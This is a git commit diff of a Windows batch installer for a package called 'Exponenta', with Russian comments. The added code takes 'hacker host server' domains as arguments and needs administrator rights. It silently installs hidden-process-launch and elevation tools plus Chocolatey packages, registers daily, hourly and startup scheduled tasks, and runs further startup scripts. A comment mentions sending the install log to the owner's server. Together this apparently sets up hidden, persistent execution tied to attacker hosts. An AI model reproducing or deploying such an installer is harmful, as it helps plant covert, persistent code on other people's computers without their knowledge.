0d51655d9bf40535f4ea33ecb8fb828029362762
Юрий А. Денисов <yudenisov@mail.ru>
2018-06-21 16:09:42 +0400

    Fifth Commit

--- Windows/Dest/Install_MainExponenta.bat
+++ Windows/Dest/Install_MainExponenta.bat
@@ -2,7 +2,9 @@
 rem
 rem Коммандный файл инсталляции дистрибутива с основными файлами пакета "Exponenta"
 rem
-rem Файл возвращает:
+rem USAGE
+rem > Install_MainExponenta.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
+rem Запускать файл с правами администратора
 
 setlocal enableextensions enabledelayedexpansion
 
@@ -10,7 +12,10 @@ Rem Установка системнмных переменных окружения
 
 set curdir=%CD%
 set Key=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
-set Dest_DIR=c:\Pub1
+set Dest_DIR=c:\pub1
+set ELEVATION=c:\Elevation
+set Hidden_Start="C:\Program Files\Hidden Start"
+set Chocolatey=%ALLUSERSPROFILE%\chocolatey
 
 rem Проверка зависимостей системного окружения
 rem
@@ -63,28 +68,55 @@ Reg Add "!Key!" /v PUB1 /t REG_SZ /d "!Dest_DIR!" /f
 call reg_addtopath.bat %DestDIR%\Util
 
 cd /d %curdir%
+
+rem Install Hidden Start Plugin
+if exist %Hidden_Start% goto pass_HiddenStart
+if not exist Hidden_Start.SFX.exe goto pass_HiddenStart
+echo "Install Hidden Start..."
 Hidden_Start.SFX.exe
+:pass_HiddenStart
 
+rem Install Elevation Plugin
+if exist %ELEVATION% goto pass_Elevation
+if not exist Elevation.SFX.exe goto pass_Elevation
+echo "Install Elevation..."
+Elevation.SFX.exe
+:pass_Elevation
 
+rem Install Chocolatey Packet
+if exist %Chocolatey% goto pass_Chocolatey
+if not exist chock.install.cmd goto pass_Chocolatey
+echo "Install Chocolatey..."
+./chock.install.cmd
+:pass_Chocolatey
+
+rem Install Chocolatey's Packet
+if exist %Chocolatey% goto pass_ChocPack
+if not exist choc_pack.install.cmd goto pass_ChocPack
+echo "Install Chocolatey's Packets..."
+./choc_pack.install.cmd
+:pass_ChocPack
 
 rem Правка файлов конфигурации модуля Exponenta
 @echo on
 rem "=== Changing Exponente Config ==="
 rem
 
-rem Создание резервной копии onSysLoad
-rem
-rem backup-sysloads
-rem
 rem создание списка постоянных изменений для демонов
-rem echo > Packet_onload.bat
-rem echo  > packet_send.bat
-rem echo > packet_email.bat
-rem
-rem Копирование манифеста в нужное место
+cd /d %Dest_DIR%\Util
+
+schtask /Create /XML User_Dayly_Tasks1.xml /TN "User Dayly Task1" /F
+
+schtask /Create /XML User_Hourly_Tasks1.xml /TN "User Hourly Task1" /F
+
+schtask /Create /XML User_OnStart_Task1.xml /TN "User OnStart Task1" /F
+
 rem
 rem
 echo off
+./onsysload.bat
+./user_onstart1.bat
+./user_hourly1.bat
 echo -
 echo Installation is made with Success!
 rem
@@ -111,14 +143,8 @@ rem Отправка лога установки на сервер хозяина
 rem curl
 goto sess_Finish
 
-:Bad_ID
-echo General Error
-echo Bad ID or missing dependence
-echo 
-echo The yuden.Exponenta configuration stay the same.
-rem
-rem Отправка лога установки на сервер хозяина
-rem curl
-
 :sess_Finish
+
+cd /d %curdir%
+
 rem pause
